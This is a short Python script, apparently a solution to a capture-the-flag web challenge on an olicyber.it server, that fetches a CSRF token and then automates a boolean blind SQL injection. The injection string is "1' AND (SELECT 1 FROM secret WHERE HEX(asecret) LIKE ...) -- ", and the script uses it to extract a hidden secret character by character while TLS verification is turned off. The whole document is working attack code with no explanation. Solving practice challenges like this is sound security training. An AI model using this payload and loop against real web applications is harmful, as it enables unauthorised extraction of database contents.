import requests

url = "http://web-17.challs.olicyber.it/api/blind"

client = requests.session()

resp = client.get("http://web-17.challs.olicyber.it/api/get_token")
resp = resp.json()
token = resp["token"]
headers = {"X-Csrftoken" : token}

guess = ''
dictionary = '0123456789abcdef'

while True:
    for c in dictionary:
        query = "1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '"+ guess + c +"%') -- "
        payload = {'query' : query, }
        response = client.post(url, json=payload, headers=headers, verify=False)
        response = response.json()
        if response["result"] == "Success":
            guess += c
            if len(guess) % 2 == 0:
                print(bytes.fromhex(guess))
            break
    else: break